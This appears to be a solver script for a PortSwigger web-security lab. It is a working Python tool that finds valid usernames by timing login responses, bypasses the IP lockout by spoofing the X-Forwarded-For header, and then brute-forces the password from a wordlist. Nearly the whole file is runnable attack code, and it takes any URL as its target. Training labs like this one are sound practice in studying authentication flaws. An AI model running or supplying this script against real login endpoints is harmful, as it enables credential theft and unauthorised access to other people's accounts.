# Lab 05 — Username enumeration via response timing
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
#
# Vulnerability: Valid usernames trigger an expensive bcrypt password hash
#                operation → measurably longer response times vs invalid usernames
#                + IP block is bypassable via X-Forwarded-For header
# Aim:           Enumerate the valid username by timing, brute-force their password
#
# Technique:
#   Use a very long dummy password to maximise hash time for valid usernames.
#   Rotate X-Forwarded-For to bypass the IP block.
#   Sort responses by elapsed time — the outlier is the valid username.
#
# Usage: python authentication_lab05.py <url> <usernames_file> <passwords_file>

import sys
import time
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# A very long dummy password amplifies the bcrypt timing difference
LONG_DUMMY_PASSWORD = "A" * 200


def enumerate_username_timing(session, url, usernames):
    print(f"  ➜  Timing {len(usernames)} usernames with a 200-char dummy password...\n")
    results = []

    for i, username in enumerate(usernames, 1):
        xff_ip = f"10.0.0.{(i % 254) + 1}"  # rotate through a /24

        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": LONG_DUMMY_PASSWORD}
        if csrf:
            data["csrf"] = csrf

        start = time.time()
        session.post(
            f"{url}/login",
            data=data,
            headers={"X-Forwarded-For": xff_ip},
            allow_redirects=True
        )
        elapsed = time.time() - start
        results.append((elapsed, username))

        if i % 25 == 0:
            print(f"  ·  {i}/{len(usernames)} timed... (current slowest: {max(results)[1]!r})")

    results.sort(reverse=True)
    print(f"\n  Top 5 slowest responses:")
    for elapsed, username in results[:5]:
        print(f"     {elapsed:.3f}s  {username!r}")

    return results[0][1]


def brute_force_password(session, url, username, passwords):
    print(f"  ➜  Brute-forcing password for {username!r}...\n")
    for i, password in enumerate(passwords, 1):
        xff_ip = f"10.1.0.{(i % 254) + 1}"
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": username, "password": password}
        if csrf:
            data["csrf"] = csrf

        r = session.post(
            f"{url}/login",
            data=data,
            headers={"X-Forwarded-For": xff_ip},
            allow_redirects=False
        )
        if r.status_code == 302:
            print(f"  ✔  Password found: {password!r}")
            return password

        if i % 50 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 05 — USERNAME ENUMERATION VIA RESPONSE TIMING")

    if len(sys.argv) != 4:
        print("  Usage: python authentication_lab05.py <url> <usernames_file> <passwords_file>")
        sys.exit(1)

    url, ufile, pfile = sys.argv[1], sys.argv[2], sys.argv[3]
    session = make_session(proxies)
    usernames = load_wordlist(ufile)
    passwords = load_wordlist(pfile)
    if not usernames or not passwords:
        sys.exit(1)

    print("\n  ℹ  Using X-Forwarded-For rotation to bypass IP block")
    print("  ℹ  Using a 200-char dummy password to amplify bcrypt timing\n")

    section("Phase 1: Username Enumeration by Response Timing")
    valid_user = enumerate_username_timing(session, url, usernames)
    print(f"\n  ➜  Most likely valid username: {valid_user!r}")

    section("Phase 2: Password Brute-Force")
    valid_pass = brute_force_password(session, url, valid_user, passwords)
    if not valid_pass:
        print("  ✘  No valid password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: {valid_user}\nPassword: {valid_pass}")
